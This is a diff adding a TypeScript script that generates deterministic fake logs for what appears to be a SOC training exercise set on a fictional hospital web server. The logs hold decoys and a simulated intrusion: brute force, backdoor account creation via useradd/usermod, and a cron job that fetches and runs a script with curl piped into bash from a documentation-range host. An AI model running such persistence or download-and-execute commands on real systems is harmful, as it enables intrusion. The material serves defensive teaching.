@@ -1,0 +1,479 @@
+/**
+ * Generates the simulated machine's log files.
+ *
+ * Run with:  npm run gen:world --workspace @soc/server
+ * Output:    src/vfs/data/generated.ts  (committed to git)
+ *
+ * WHY GENERATE AHEAD OF TIME, AND WHY COMMIT THE OUTPUT
+ *
+ * Exercise answers depend on exact counts ("how many failed logins?"). If the
+ * logs were built at runtime from a fresh seed, every deploy would silently
+ * change the right answer. So: one fixed seed, output committed to git, and any
+ * change to the world shows up as a reviewable diff.
+ *
+ * THE WORLD
+ *
+ * Ridgeline Medical Group is a fictional regional healthcare provider. The
+ * student sits on rmg-web-02, its internet-facing patient-portal web server.
+ * Healthcare was chosen deliberately: it makes severity judgements concrete,
+ * because a breach here means regulated patient data.
+ *
+ * All external IPs come from RFC 5737 documentation ranges (192.0.2.0/24,
+ * 198.51.100.0/24, 203.0.113.0/24), which are reserved and cannot route to a
+ * real host, so no exercise ever points a student at somebody's real server.
+ *
+ * DESIGN PRINCIPLE: THE LOGS ARE MOSTLY BORING.
+ *
+ * The audience holds Security+ but has never touched a live box. The single most
+ * valuable thing to teach is signal versus noise. If every line a student greps
+ * turns out to be the attack, they learn to expect a world that does not exist.
+ * So this generates a large volume of legitimate traffic, routine cron noise,
+ * and two deliberate decoys that look alarming and are completely benign:
+ *
+ *   1. A misconfigured monitoring box (10.20.9.40) that fails authentication
+ *      every five minutes all day long. It produces more failed logins than the
+ *      actual attacker does. It is not an attack -- it is a stale password in a
+ *      monitoring config, which is exactly what this looks like in real life.
+ *   2. A DBA logging in at 03:11. Odd hour, entirely legitimate, because
+ *      scheduled maintenance runs overnight.
+ *
+ * Only after all that does one real intrusion thread through the noise.
+ */
+
+import { mkdirSync, writeFileSync } from 'node:fs';
+import { dirname, join } from 'node:path';
+import { fileURLToPath } from 'node:url';
+
+const HERE = dirname(fileURLToPath(import.meta.url));
+const OUT_FILE = join(HERE, '..', 'src', 'vfs', 'data', 'generated.ts');
+
+const HOSTNAME = 'rmg-web-02';
+const LOG_DAY = 'Aug 15';
+
+// --- deterministic randomness ------------------------------------------------
+
+/** mulberry32: small, fast, and identical across Node versions and platforms. */
+function makeRandom(seed: number): () => number {
+  let state = seed >>> 0;
+  return () => {
+    state = (state + 0x6d2b79f5) >>> 0;
+    let t = state;
+    t = Math.imul(t ^ (t >>> 15), t | 1);
+    t ^= t + Math.imul(t ^ (t >>> 7), t | 61);
+    return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
+  };
+}
+
+const rand = makeRandom(20260815);
+
+function pick<T>(items: readonly T[]): T {
+  return items[Math.floor(rand() * items.length)]!;
+}
+
+function between(min: number, max: number): number {
+  return min + Math.floor(rand() * (max - min + 1));
+}
+
+// --- the cast ----------------------------------------------------------------
+
+/** Legitimate staff, with the internal addresses they normally come from. */
+const STAFF = [
+  { user: 'jmartel', ip: '10.20.4.31' },
+  { user: 'dokafor', ip: '10.20.4.58' },
+  { user: 'rchen', ip: '10.20.4.12' },
+] as const;
+
+/** Background internet noise: opportunistic scanners hitting any public host. */
+const NOISE_IPS = [
+  '192.0.2.44',
+  '192.0.2.171',
+  '192.0.2.9',
+  '198.51.100.23',
+  '198.51.100.202',
+  '203.0.113.12',
+  '203.0.113.201',
+  '203.0.113.140',
+] as const;
+
+/** Usernames every internet scanner on earth tries. */
+const SCANNED_USERS = [
+  'admin', 'oracle', 'ubuntu', 'test', 'guest', 'user', 'postgres', 'git',
+  'jenkins', 'deploy', 'ftpuser', 'pi', 'support', 'webmaster', 'mysql',
+] as const;
+
+/** The intrusion. One IP, one compromised account, one backdoor. */
+const ATTACKER_IP = '203.0.113.55';
+const COMPROMISED_USER = 'testuser';
+const BACKDOOR_USER = 'sysmon';
+/** Where the attacker sends data. */
+const EXFIL_IP = '198.51.100.60';
+
+/** The monitoring host with a stale password. Noisy, internal, and harmless. */
+const MONITORING_IP = '10.20.9.40';
+/** Backup server, authenticates by key and always succeeds. */
+const BACKUP_IP = '10.20.9.15';
+
+// --- event plumbing ----------------------------------------------------------
+
+interface Event {
+  /** Seconds since midnight, used only for ordering. */
+  at: number;
+  line: string;
+}
+
+function hms(secondsSinceMidnight: number): string {
+  const h = Math.floor(secondsSinceMidnight / 3600) % 24;
+  const m = Math.floor(secondsSinceMidnight / 60) % 60;
+  const s = secondsSinceMidnight % 60;
+  const pad = (n: number) => String(n).padStart(2, '0');
+  return `${pad(h)}:${pad(m)}:${pad(s)}`;
+}
+
+function at(hour: number, minute: number, second = 0): number {
+  return hour * 3600 + minute * 60 + second;
+}
+
+/** Renders events into syslog-format lines, stable-sorted by time. */
+function render(events: Event[], tag: (line: string) => string): string {
+  return events
+    .map((event, index) => ({ event, index }))
+    .sort((a, b) => a.event.at - b.event.at || a.index - b.index)
+    .map(({ event }) => `${LOG_DAY} ${hms(event.at)} ${HOSTNAME} ${tag(event.line)}`)
+    .join('\n');
+}
+
+// --- auth.log ----------------------------------------------------------------
+
+/** sshd PIDs climb through the day, the way they do on a real box. */
+let sshdPid = 21_400;
+function nextPid(): number {
+  sshdPid += between(1, 9);
+  return sshdPid;
+}
+
+function buildAuthLog(): string {
+  const events: Event[] = [];
+  const add = (time: number, line: string) => events.push({ at: time, line });
+
+  /**
+   * A failed password against an account that exists. Real sshd emits the
+   * pam_unix line *and* the "Failed password" line -- and the pam_unix line is
+   * the only one carrying `user=`, which matters for the field-extraction
+   * exercises later on.
+   */
+  const failValidUser = (time: number, user: string, ip: string) => {
+    const pid = nextPid();
+    const port = between(30000, 65000);
+    add(
+      time,
+      `sshd[${pid}]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=${ip}  user=${user}`,
+    );
+    add(time + 2, `sshd[${pid}]: Failed password for ${user} from ${ip} port ${port} ssh2`);
+  };
+
+  /** A failed password against an account that does not exist. */
+  const failInvalidUser = (time: number, user: string, ip: string) => {
+    const pid = nextPid();
+    const port = between(30000, 65000);
+    add(time, `sshd[${pid}]: Invalid user ${user} from ${ip} port ${port}`);
+    add(time + 1, `sshd[${pid}]: pam_unix(sshd:auth): check pass; user unknown`);
+    add(
+      time + 1,
+      `sshd[${pid}]: pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 tty=ssh ruser= rhost=${ip}`,
+    );
+    add(time + 3, `sshd[${pid}]: Failed password for invalid user ${user} from ${ip} port ${port} ssh2`);
+    add(time + 4, `sshd[${pid}]: Connection closed by invalid user ${user} ${ip} port ${port} [preauth]`);
+  };
+
+  /** A successful interactive login. */
+  const succeed = (time: number, user: string, ip: string, uid: number, method = 'password') => {
+    const pid = nextPid();
+    const port = between(30000, 65000);
+    add(time, `sshd[${pid}]: Accepted ${method} for ${user} from ${ip} port ${port} ssh2`);
+    add(time + 1, `sshd[${pid}]: pam_unix(sshd:session): session opened for user ${user}(uid=${uid}) by (uid=0)`);
+    return pid;
+  };
+
+  const logout = (time: number, pid: number, user: string) => {
+    add(time, `sshd[${pid}]: pam_unix(sshd:session): session closed for user ${user}`);
+  };
+
+  // -- Routine machinery: cron wakes up every hour, all day. ------------------
+  for (let hour = 0; hour < 24; hour += 1) {
+    add(at(hour, 17, 1), `CRON[${between(9000, 30000)}]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)`);
+    add(at(hour, 17, 1), `CRON[${between(9000, 30000)}]: pam_unix(cron:session): session closed for user root`);
+  }
+
+  // -- Nightly backup, key-based, always succeeds. ---------------------------
+  for (const hour of [1, 5]) {
+    const pid = succeed(at(hour, 30, between(0, 40)), 'svc-backup', BACKUP_IP, 1500, 'publickey');
+    logout(at(hour, 34, between(0, 50)), pid, 'svc-backup');
+  }
+
+  // -- DECOY 1: overnight DBA maintenance. Odd hour, entirely legitimate. -----
+  const rchenPid = succeed(at(3, 11, 27), 'rchen', '10.20.4.12', 1003);
+  add(at(3, 14, 2), `sudo:    rchen : TTY=pts/0 ; PWD=/home/rchen ; USER=root ; COMMAND=/usr/bin/systemctl restart postgresql`);
+  add(at(3, 14, 2), `sudo: pam_unix(sudo:session): session opened for user root(uid=0) by rchen(uid=1003)`);
+  add(at(3, 14, 9), `sudo: pam_unix(sudo:session): session closed for user root`);
+  logout(at(3, 41, 18), rchenPid, 'rchen');
+
+  // -- DECOY 2: monitoring host with a stale password, every 5 minutes. ------
+  // This single misconfiguration out-produces the real attacker. That is the
+  // point: volume alone is not evidence of an attack.
+  for (let minutes = 0; minutes < 24 * 60; minutes += 5) {
+    failValidUser(at(0, minutes, between(0, 30)), 'nagios', MONITORING_IP);
+  }
+
+  // -- Internet background radiation: scattered scanners, all day. -----------
+  for (let hour = 0; hour < 24; hour += 1) {
+    const attempts = between(2, 7);
+    for (let i = 0; i < attempts; i += 1) {
+      failInvalidUser(at(hour, between(0, 59), between(0, 59)), pick(SCANNED_USERS), pick(NOISE_IPS));
+    }
+  }
+
+  // -- Normal working day: staff arrive and log in. --------------------------
+  const staffSessions: Array<{ pid: number; user: string }> = [];
+  STAFF.forEach((person, index) => {
+    const pid = succeed(at(7, 38 + index * 11, between(0, 59)), person.user, person.ip, 1001 + index);
+    staffSessions.push({ pid, user: person.user });
+  });
+
+  // A perfectly ordinary sudo: ops patching the box. Looks like privilege use,
+  // and is exactly what privilege use is supposed to look like.
+  add(at(8, 15, 33), `sudo:  jmartel : TTY=pts/2 ; PWD=/home/jmartel ; USER=root ; COMMAND=/usr/bin/apt-get upgrade -y`);
+  add(at(8, 15, 33), `sudo: pam_unix(sudo:session): session opened for user root(uid=0) by jmartel(uid=1001)`);
+  add(at(8, 22, 47), `sudo: pam_unix(sudo:session): session closed for user root`);
+
+  // Somebody fat-fingers their own password twice, then gets in. Ordinary.
+  failValidUser(at(9, 2, 14), 'dokafor', '10.20.4.58');
+  failValidUser(at(9, 2, 31), 'dokafor', '10.20.4.58');
+  const dokaforRetry = succeed(at(9, 2, 58), 'dokafor', '10.20.4.58', 1002);
+  logout(at(11, 47, 3), dokaforRetry, 'dokafor');
+
+  // -- THE ATTACK, phase 1: brute force, 09:12 to 09:47. --------------------
+  // Concentrated, from one primary IP with three others sharing the wordlist.
+  const bruteIps = [ATTACKER_IP, '203.0.113.12', '198.51.100.77', '203.0.113.88'];
+  const bruteTargets = ['root', 'admin', 'oracle', 'ubuntu', 'postgres', 'test', COMPROMISED_USER, 'git', 'deploy'];
+  for (let second = at(9, 12, 3); second < at(9, 47, 0); second += between(3, 11)) {
+    const target = pick(bruteTargets);
+    const ip = rand() < 0.55 ? ATTACKER_IP : pick(bruteIps);
+    // root and testuser exist on this box; the rest do not.
+    if (target === 'root' || target === COMPROMISED_USER || target === 'postgres') {
+      failValidUser(second, target, ip);
+    } else {
+      failInvalidUser(second, target, ip);
+    }
+  }
+
+  // -- THE ATTACK, phase 2: one attempt succeeds at 10:14. ------------------
+  // testuser is a stale test account nobody remembered to disable. Its password
+  // was weak enough to guess. This is the finding.
+  const attackerPid = succeed(at(10, 14, 22), COMPROMISED_USER, ATTACKER_IP, 1004);
+
+  // -- THE ATTACK, phase 3: privilege escalation and a backdoor account. ----
+  add(at(10, 22, 41), `sudo:  ${COMPROMISED_USER} : TTY=pts/1 ; PWD=/home/${COMPROMISED_USER} ; USER=root ; COMMAND=/usr/sbin/useradd -m -s /bin/bash -u 1501 ${BACKDOOR_USER}`);
+  add(at(10, 22, 41), `sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ${COMPROMISED_USER}(uid=1004)`);
+  add(at(10, 22, 42), `useradd[25340]: new group: name=${BACKDOOR_USER}, GID=1501`);
+  add(at(10, 22, 42), `useradd[25340]: new user: name=${BACKDOOR_USER}, UID=1501, GID=1501, home=/home/${BACKDOOR_USER}, shell=/bin/bash`);
+  add(at(10, 22, 44), `sudo: pam_unix(sudo:session): session closed for user root`);
+  add(at(10, 23, 18), `passwd[25361]: password for '${BACKDOOR_USER}' changed by 'root'`);
+  add(at(10, 31, 5), `sudo:  ${COMPROMISED_USER} : TTY=pts/1 ; PWD=/home/${COMPROMISED_USER} ; USER=root ; COMMAND=/usr/sbin/usermod -aG sudo ${BACKDOOR_USER}`);
+  add(at(10, 31, 5), `sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ${COMPROMISED_USER}(uid=1004)`);
+  add(at(10, 31, 6), `usermod[25402]: add '${BACKDOOR_USER}' to group 'sudo'`);
+  add(at(10, 31, 6), `usermod[25402]: add '${BACKDOOR_USER}' to shadow group 'sudo'`);
+  add(at(10, 31, 8), `sudo: pam_unix(sudo:session): session closed for user root`);
+
+  // Persistence: a cron job the attacker installs to phone home.
+  add(at(10, 40, 12), `crontab[25455]: (${BACKDOOR_USER}) BEGIN EDIT (${BACKDOOR_USER})`);
+  add(at(10, 40, 51), `crontab[25455]: (${BACKDOOR_USER}) REPLACE (${BACKDOOR_USER})`);
+  add(at(10, 40, 51), `crontab[25455]: (${BACKDOOR_USER}) END EDIT (${BACKDOOR_USER})`);
+
+  logout(at(10, 52, 30), attackerPid, COMPROMISED_USER);
+
+  // -- THE ATTACK, phase 4: the attacker returns through the backdoor. ------
+  const backdoorPid = succeed(at(11, 5, 14), BACKDOOR_USER, ATTACKER_IP, 1501, 'publickey');
+  add(at(11, 6, 2), `sudo:  ${BACKDOOR_USER} : TTY=pts/3 ; PWD=/var/www/portal ; USER=root ; COMMAND=/bin/tar -czf /tmp/.cache/pt.tar.gz /var/www/portal/exports`);
+  add(at(11, 6, 2), `sudo: pam_unix(sudo:session): session opened for user root(uid=0) by ${BACKDOOR_USER}(uid=1501)`);
+  add(at(11, 9, 40), `sudo: pam_unix(sudo:session): session closed for user root`);
+  logout(at(11, 31, 55), backdoorPid, BACKDOOR_USER);
+
+  // Staff go home.
+  staffSessions.forEach((session, index) => {
+    logout(at(16, 40 + index * 7, between(0, 59)), session.pid, session.user);
+  });
+
+  return render(events, (line) => line);
+}
+
+// --- syslog ------------------------------------------------------------------
+
+function buildSyslog(): string {
+  const events: Event[] = [];
+  const add = (time: number, line: string) => events.push({ at: time, line });
+
+  add(at(0, 0, 8), 'systemd[1]: logrotate.service: Succeeded.');
+  add(at(0, 0, 8), 'systemd[1]: Finished Rotate log files.');
+  add(at(0, 3, 12), 'kernel: [86412.339481] EXT4-fs (nvme0n1p2): mounted filesystem with ordered data mode.');
+
+  // Hourly cron churn, the loudest boring thing in any syslog.
+  for (let hour = 0; hour < 24; hour += 1) {
+    add(at(hour, 17, 1), `CRON[${between(9000, 30000)}]: (root) CMD (cd / && run-parts --report /etc/cron.hourly)`);
+  }
+
+  // Nightly backup job.
+  add(at(1, 30, 15), 'systemd[1]: Started Ridgeline nightly backup.');
+  add(at(1, 52, 41), 'backup-agent[3312]: snapshot complete: 41.7 GB transferred to rmg-backup-01');
+  add(at(1, 52, 42), 'systemd[1]: rmg-backup.service: Succeeded.');
+
+  // A genuine service problem, unrelated to the intrusion. Students should learn
+  // that not every error in syslog is security-relevant.
+  add(at(3, 12, 44), 'systemd[1]: Stopping PostgreSQL RDBMS...');
+  add(at(3, 12, 47), 'postgresql[1841]: server stopped');
+  add(at(3, 12, 51), 'systemd[1]: Started PostgreSQL RDBMS.');
+  add(at(3, 12, 52), 'postgresql[2033]: database system was not properly shut down; automatic recovery in progress');
+  add(at(3, 12, 55), 'postgresql[2033]: redo done at 0/1A2F3C8');
+  add(at(3, 12, 56), 'postgresql[2033]: database system is ready to accept connections');
+
+  // Routine daytime application traffic. The portal is a real service with real
+  // users, so this is the bulk of the file -- as it would be on a live host.
+  const PORTAL_PATHS = [
+    '/portal/appointments',
+    '/portal/messages',
+    '/portal/results/summary',
+    '/portal/billing/statements',
+    '/portal/profile',
+  ] as const;
+  // Paths every commodity scanner probes. Noisy, constant, and harmless against
+  // a host that does not run WordPress or phpMyAdmin.
+  const SCANNED_PATHS = ['/wp-login.php', '/phpmyadmin/', '/.env', '/admin/config.php', '/vendor/phpunit'] as const;
+
+  for (let hour = 7; hour < 19; hour += 1) {
+    for (let i = 0; i < between(6, 11); i += 1) {
+      add(
+        at(hour, between(0, 59), between(0, 59)),
+        `nginx[1422]: patient-portal: 200 GET ${pick(PORTAL_PATHS)} upstream=127.0.0.1:8080 rt=0.0${between(11, 89)}`,
+      );
+    }
+    add(
+      at(hour, between(0, 59), between(0, 59)),
+      `nginx[1422]: patient-portal: 200 POST /portal/api/session upstream=127.0.0.1:8080 rt=0.1${between(10, 99)}`,
+    );
+    add(
+      at(hour, between(0, 59), between(0, 59)),
+      `nginx[1422]: patient-portal: 404 GET ${pick(SCANNED_PATHS)} upstream=- rt=0.001`,
+    );
+    // Occasional genuine application errors, unrelated to any attack.
+    if (rand() < 0.4) {
+      add(
+        at(hour, between(0, 59), between(0, 59)),
+        `nginx[1422]: patient-portal: 502 GET /portal/api/labs upstream=127.0.0.1:8080 rt=30.001`,
+      );
+      add(
+        at(hour, between(0, 59), between(0, 59)),
+        `portal-app[8080]: ERROR upstream timeout contacting lab-interface at 10.20.7.22:9443 after 30s`,
+      );
+    }
+  }
+
+  // Systemd timers, the metronome of any modern Linux box.
+  for (let hour = 0; hour < 24; hour += 2) {
+    add(at(hour, 6, between(0, 59)), 'systemd[1]: Starting Refresh fwupd metadata and update motd...');
+    add(at(hour, 6, 59), 'systemd[1]: fwupd-refresh.service: Succeeded.');
+  }
+
+  // Kernel chatter: conntrack, ufw drops, and periodic housekeeping.
+  for (let hour = 0; hour < 24; hour += 3) {
+    add(
+      at(hour, between(10, 50), between(0, 59)),
+      `kernel: [${between(80000, 130000)}.${between(100000, 999999)}] [UFW BLOCK] IN=eth0 OUT= SRC=${pick(NOISE_IPS)} DST=10.20.6.40 PROTO=TCP SPT=${between(40000, 60000)} DPT=${pick([23, 445, 3389, 8080, 5900])}`,
+    );
+  }
+
+  // Mail queue for appointment reminders.
+  for (const hour of [7, 12, 17]) {
+    add(at(hour, 5, between(0, 40)), `postfix/qmgr[1104]: ${between(100000, 999999).toString(16).toUpperCase()}: from=<noreply@ridgelinemed.example>, size=${between(2000, 9000)}, nrcpt=1 (queue active)`);
+    add(at(hour, 5, 55), `postfix/smtp[1131]: delivered to mailhost 10.20.7.10, status=sent`);
+  }
+
+  // Recurring disk pressure warning: real, needs fixing, not a security event.
+  for (const hour of [4, 10, 16, 22]) {
+    add(at(hour, 25, 0), `disk-monitor[2210]: WARNING: /var is 87% full (threshold 85%)`);
+  }
+
+  // The compromised account's session also lands in syslog, so a student can
+  // corroborate the same event across two different log files.
+  add(at(10, 14, 23), `systemd-logind[912]: New session 4821 of user ${COMPROMISED_USER}.`);
+  add(at(10, 14, 23), `systemd[1]: Started Session 4821 of user ${COMPROMISED_USER}.`);
+  add(at(10, 52, 31), `systemd-logind[912]: Removed session 4821.`);
+
+  add(at(10, 22, 43), `systemd-logind[912]: New session 4822 of user root.`);
+  add(at(10, 40, 52), `cron[878]: (${BACKDOOR_USER}) RELOAD (crontabs/${BACKDOOR_USER})`);
+  add(at(10, 45, 0), `CRON[25501]: (${BACKDOOR_USER}) CMD (curl -s https://${EXFIL_IP}/b -o /tmp/.cache/u && bash /tmp/.cache/u)`);
+  add(at(11, 0, 0), `CRON[25604]: (${BACKDOOR_USER}) CMD (curl -s https://${EXFIL_IP}/b -o /tmp/.cache/u && bash /tmp/.cache/u)`);
+  add(at(11, 5, 15), `systemd-logind[912]: New session 4830 of user ${BACKDOOR_USER}.`);
+  add(at(11, 15, 0), `CRON[25702]: (${BACKDOOR_USER}) CMD (curl -s https://${EXFIL_IP}/b -o /tmp/.cache/u && bash /tmp/.cache/u)`);
+  add(at(11, 31, 56), `systemd-logind[912]: Removed session 4830.`);
+
+  // Kernel noise, including the outbound transfer the attacker triggers.
+  add(at(6, 41, 2), 'kernel: [108234.771290] audit: type=1400 apparmor="DENIED" operation="open" profile="/usr/sbin/nginx" name="/proc/1422/oom_score_adj"');
+  add(at(11, 12, 8), `kernel: [124901.220417] nf_conntrack: table full, dropping packet`);
+  add(at(11, 12, 30), `kernel: [124923.884012] TCP: out-of-order packets from ${EXFIL_IP}`);
+
+  add(at(18, 30, 0), 'systemd[1]: Starting Daily apt download activities...');
+  add(at(18, 31, 12), 'systemd[1]: apt-daily.service: Succeeded.');
+
+  return render(events, (line) => line);
+}
+
+// --- emit --------------------------------------------------------------------
+
+/** Escapes a log body for embedding in a TypeScript template literal. */
+function asTemplateLiteral(text: string): string {
+  const escaped = text.replace(/\\/g, '\\\\').replace(/`/g, '\\`').replace(/\$\{/g, '\\${');
+  return '`' + escaped + '`';
+}
+
+const authLog = buildAuthLog();
+const syslog = buildSyslog();
+
+const banner = `/**
+ * GENERATED FILE -- DO NOT EDIT BY HAND.
+ *
+ * Produced by scripts/generate-world.ts. To change the simulated world, edit
+ * that script and re-run:  npm run gen:world --workspace @soc/server
+ *
+ * This file is committed on purpose: exercise answers depend on the exact
+ * contents, so the logs must not change unless somebody intends them to.
+ */
+`;
+
+const body = `${banner}
+/** ${authLog.split('\n').length} lines of authentication events for ${LOG_DAY}. */
+export const AUTH_LOG = ${asTemplateLiteral(authLog)};
+
+/** ${syslog.split('\n').length} lines of system events for ${LOG_DAY}. */
+export const SYSLOG = ${asTemplateLiteral(syslog)};
+`;
+
+mkdirSync(dirname(OUT_FILE), { recursive: true });
+writeFileSync(OUT_FILE, body, 'utf8');
+
+const authLines = authLog.split('\n').length;
+const sysLines = syslog.split('\n').length;
+const countIn = (text: string, needle: string) => text.split('\n').filter((l) => l.includes(needle)).length;
+
+process.stdout.write(
+  [
+    `Wrote ${OUT_FILE}`,
+    `  auth.log : ${authLines} lines`,
+    `    Failed password        : ${countIn(authLog, 'Failed password')}`,
+    `    Accepted               : ${countIn(authLog, 'Accepted')}`,
+    `    Invalid user           : ${countIn(authLog, 'Invalid user')}`,
+    `    sudo                   : ${countIn(authLog, 'sudo:')}`,
+    `    from ${ATTACKER_IP}    : ${countIn(authLog, ATTACKER_IP)}`,
+    `    from ${MONITORING_IP} (decoy): ${countIn(authLog, MONITORING_IP)}`,
+    `  syslog   : ${sysLines} lines`,
+    '',
+  ].join('\n'),
+);
